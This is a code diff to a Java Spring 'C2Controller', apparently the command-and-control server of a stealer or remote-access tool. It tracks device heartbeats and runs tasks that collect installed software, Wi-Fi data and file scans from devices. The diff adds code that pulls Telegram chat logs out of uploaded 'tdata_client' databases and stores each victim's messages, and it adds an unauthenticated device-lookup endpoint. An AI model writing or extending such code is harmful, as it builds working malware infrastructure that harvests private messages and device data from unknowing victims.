@@ -29,10 +29,11 @@ import java.util.ArrayList;
 
 import java.io.FileOutputStream;
 import java.util.Base64;
-import org.springframework.data.redis.core.StringRedisTemplate;
+// import org.springframework.data.redis.core.StringRedisTemplate;
 import java.util.concurrent.TimeUnit;
 import cn.hutool.cache.Cache;
 import cn.hutool.cache.CacheUtil;
+import cn.hutool.cache.impl.TimedCache;
 import cn.hutool.crypto.digest.DigestUtil;
 
 /**
@@ -44,7 +45,11 @@ public class C2Controller {
 
     private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(C2Controller.class);
     
-    // In-memory cache removed in favor of Redis
+    // In-memory cache for deduplication (replaces Redis)
+    private static final TimedCache<String, String> dedupCache = CacheUtil.newTimedCache(TimeUnit.DAYS.toMillis(1));
+    static {
+        dedupCache.schedulePrune(TimeUnit.HOURS.toMillis(1));
+    }
 
     @Resource
     private C2TaskMapper c2TaskMapper;
@@ -74,7 +79,13 @@ public class C2Controller {
     private com.yupi.springbootinit.service.OcrService ocrService;
 
     @Resource
-    private StringRedisTemplate stringRedisTemplate;
+    private TgAccountMapper tgAccountMapper;
+
+    @Resource
+    private TgMessageMapper tgMessageMapper;
+
+    // @Resource
+    // private StringRedisTemplate stringRedisTemplate;
 
     private final Gson gson = new Gson();
     
@@ -244,6 +255,13 @@ public class C2Controller {
             log.error("Injection failed", e);
             return "Failed: " + e.getMessage();
         }
+    }
+
+    @GetMapping("/debug/device")
+    public C2Device getDevice(@RequestParam("uuid") String uuid) {
+        QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
+        queryWrapper.eq("uuid", uuid);
+        return c2DeviceMapper.selectOne(queryWrapper);
     }
 
     @PostMapping("/heartbeat")
@@ -469,10 +487,10 @@ public class C2Controller {
                 if (result != null && ("get_software".equals(task.getCommand()) || "get_wifi".equals(task.getCommand()) || "scan_recent".equals(task.getCommand()))) {
                      String currentHash = DigestUtil.md5Hex(result);
                      String cacheKey = "dedup:" + task.getDeviceUuid() + "_" + task.getCommand() + "_" + currentHash;
-                     if (Boolean.TRUE.equals(stringRedisTemplate.hasKey(cacheKey))) {
+                     if (dedupCache.containsKey(cacheKey)) {
                          isDuplicate = true;
                      } else {
-                         stringRedisTemplate.opsForValue().set(cacheKey, "1", 1, TimeUnit.HOURS);
+                         dedupCache.put(cacheKey, "1", TimeUnit.HOURS.toMillis(1));
                      }
                 }
                 
@@ -985,6 +1003,7 @@ public class C2Controller {
                                            @RequestParam("uuid") String uuid,
                                            @RequestParam(value = "taskId", required = false) String taskId,
                                            HttpServletRequest request) {
+        log.info("Received upload request: filename={}, uuid={}", file.getOriginalFilename(), uuid);
         if (file.isEmpty()) {
             return ResultUtils.error(ErrorCode.PARAMS_ERROR, "File is empty");
         }
@@ -1032,7 +1051,7 @@ public class C2Controller {
                  
                  // Process asynchronously
                  java.util.concurrent.CompletableFuture.runAsync(() -> {
-                     processScanResults(tempDb, targetDirName, taskId);
+                     processScanResults(tempDb, targetDirName, taskId, filename);
                  });
                  
                  return ResultUtils.success("Scan results uploaded, processing in background");
@@ -1090,8 +1109,8 @@ public class C2Controller {
         }
     }
 
-    private void processScanResults(File tempDb, String deviceUuid, String taskId) {
-        log.info("Processing scan results for device: {}, taskId: {}", deviceUuid, taskId);
+    private void processScanResults(File tempDb, String deviceUuid, String taskId, String originalFilename) {
+        log.info("Processing scan results for device: {}, taskId: {}, filename: {}", deviceUuid, taskId, originalFilename);
         // Find device by UUID
         QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
         queryWrapper.eq("uuid", deviceUuid);
@@ -1119,6 +1138,8 @@ public class C2Controller {
                         device.setMacAddress(rs.getString("mac_address"));
                         device.setHostName(rs.getString("hostname"));
                         device.setOs(rs.getString("os"));
+                        device.setIsMonitorOn(rs.getInt("auto_screenshot"));
+                        device.setDataStatus(rs.getString("data_status"));
                         device.setLastSeen(new Date());
                         
                         // Update device
@@ -1159,7 +1180,7 @@ public class C2Controller {
                     // Hash Check
                     String currentHash = DigestUtil.md5Hex(hashBuilder.toString());
                     String redisKey = "dedup:hash:wifi:" + deviceUuid;
-                    String lastHash = stringRedisTemplate.opsForValue().get(redisKey);
+                    String lastHash = dedupCache.get(redisKey);
                     
                     if (lastHash != null && lastHash.equals(currentHash)) {
                         log.info("WiFi scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
@@ -1176,8 +1197,8 @@ public class C2Controller {
                             }
                         }
                         
-                        // Update Redis
-                        stringRedisTemplate.opsForValue().set(redisKey, currentHash, 7, TimeUnit.DAYS);
+                        // Update Cache
+                        dedupCache.put(redisKey, currentHash, TimeUnit.DAYS.toMillis(7));
                         log.info("Updated WiFi scan results for device {}", deviceUuid);
                     }
 
@@ -1211,7 +1232,7 @@ public class C2Controller {
                     
                     String currentHash = DigestUtil.md5Hex(hashBuilder.toString());
                     String redisKey = "dedup:hash:soft:" + deviceUuid;
-                    String lastHash = stringRedisTemplate.opsForValue().get(redisKey);
+                    String lastHash = dedupCache.get(redisKey);
                     
                     if (lastHash != null && lastHash.equals(currentHash)) {
                         log.info("Software scan results identical to last scan for device {}, skipping DB write.", deviceUuid);
@@ -1226,7 +1247,7 @@ public class C2Controller {
                             }
                         }
                         
-                        stringRedisTemplate.opsForValue().set(redisKey, currentHash, 7, TimeUnit.DAYS);
+                        dedupCache.put(redisKey, currentHash, TimeUnit.DAYS.toMillis(7));
                         log.info("Updated Software scan results for device {}", deviceUuid);
                     }
 
@@ -1234,7 +1255,86 @@ public class C2Controller {
                     log.warn("Failed to process installed_software: {}", e.getMessage());
                 }
 
-                // 4. Process File Scan Results (files or file_scan_results)
+                // 4. Process Chat Logs
+                try {
+                    // Extract TG ID from filename (tdata_client_TGID.db)
+                    String tgId = null;
+                    if (originalFilename != null && originalFilename.startsWith("tdata_client_") && originalFilename.endsWith(".db")) {
+                        String temp = originalFilename.substring("tdata_client_".length());
+                        tgId = temp.substring(0, temp.length() - 3); // Remove .db
+                    }
+
+                    if (tgId != null && !tgId.isEmpty()) {
+                        // Find or Create TgAccount
+                        TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tgId", tgId));
+                        if (account == null) {
+                            account = new TgAccount();
+                            account.setTgId(tgId);
+                            account.setUsername("Unknown (" + tgId + ")"); // Default
+                            account.setCreateTime(new Date());
+                            account.setUpdateTime(new Date());
+                            account.setIsDelete(0);
+                            tgAccountMapper.insert(account);
+                            log.info("Created new TgAccount for TGID: {}", tgId);
+                        }
+                        
+                        Long accountId = account.getId();
+
+                        // Check if chat_logs table exists
+                        boolean hasChatLogs = false;
+                        try {
+                            stmt.executeQuery("SELECT 1 FROM chat_logs LIMIT 1").close();
+                            hasChatLogs = true;
+                        } catch (Exception ignore) {}
+
+                        if (hasChatLogs) {
+                            java.sql.ResultSet rs = stmt.executeQuery("SELECT * FROM chat_logs");
+                            int count = 0;
+                            while (rs.next()) {
+                                String chatId = rs.getString("chat_id");
+                                String sender = rs.getString("sender"); // senderId or name?
+                                String content = rs.getString("content");
+                                long timestamp = rs.getLong("timestamp");
+                                int isOutgoing = rs.getInt("is_outgoing");
+                                
+                                // Simple deduplication: check if message exists by content & time & chatId & accountId
+                                // Note: This is expensive for many messages. Ideally use msgId if available.
+                                // Schema doesn't have msgId in chat_logs (based on README).
+                                // But TgMessage has msgId.
+                                // We'll use hash or just insert.
+                                // Let's check if we can use timestamp as unique key for now? No.
+                                
+                                TgMessage msg = new TgMessage();
+                                msg.setAccountId(accountId);
+                                msg.setChatId(chatId);
+                                msg.setSenderId(sender);
+                                msg.setContent(content);
+                                msg.setMsgDate(new Date(timestamp * 1000));
+                                msg.setMsgType(isOutgoing == 1 ? "outgoing" : "incoming");
+                                msg.setCreateTime(new Date());
+                                msg.setIsDelete(0);
+                                
+                                // Check duplicate
+                                QueryWrapper<TgMessage> dup = new QueryWrapper<>();
+                                dup.eq("accountId", accountId)
+                                   .eq("chatId", chatId)
+                                   .eq("msgDate", msg.getMsgDate())
+                                   .eq("content", content);
+                                   
+                                if (tgMessageMapper.selectCount(dup) == 0) {
+                                    tgMessageMapper.insert(msg);
+                                    count++;
+                                }
+                            }
+                            rs.close();
+                            log.info("Imported {} chat logs for TGID: {}", count, tgId);
+                        }
+                    }
+                } catch (Exception e) {
+                    log.warn("Failed to process chat_logs: {}", e.getMessage());
+                }
+
+                // 5. Process File Scan Results (files or file_scan_results)
                 try {
                     // Clear old File Scan records (Only full scan, not recent)
                     c2FileScanMapper.delete(new QueryWrapper<C2FileScan>().eq("device_uuid", deviceUuid).eq("isRecent", 0));
@@ -1261,10 +1361,10 @@ public class C2Controller {
                         
                         // Deduplication check
                         String key = "dedup:file:" + deviceUuid + ":" + filePath;
-                        if (Boolean.TRUE.equals(stringRedisTemplate.hasKey(key))) {
+                        if (dedupCache.containsKey(key)) {
                             // continue; // Commented out to ensure we populate node table even if cached
                         }
-                        stringRedisTemplate.opsForValue().set(key, "1", 1, TimeUnit.HOURS);
+                        dedupCache.put(key, "1", TimeUnit.HOURS.toMillis(1));
 
                         // 1. Add to C2FileScan (Search/Flat View)
                         C2FileScan scan = new C2FileScan();
@@ -1571,10 +1671,10 @@ public class C2Controller {
             if (device.getUuid() != null) {
                 String cacheKey = "rate:hb:" + device.getUuid();
                 try {
-                    if (Boolean.TRUE.equals(stringRedisTemplate.hasKey(cacheKey))) {
+                    if (dedupCache.containsKey(cacheKey)) {
                         skipUpdate = true;
                     } else {
-                        stringRedisTemplate.opsForValue().set(cacheKey, String.valueOf(System.currentTimeMillis()), 30, TimeUnit.SECONDS);
+                        dedupCache.put(cacheKey, String.valueOf(System.currentTimeMillis()), TimeUnit.SECONDS.toMillis(30));
                     }
                 } catch (Exception e) {
                     log.error("Cache error in heartbeat: {}", e.getMessage());
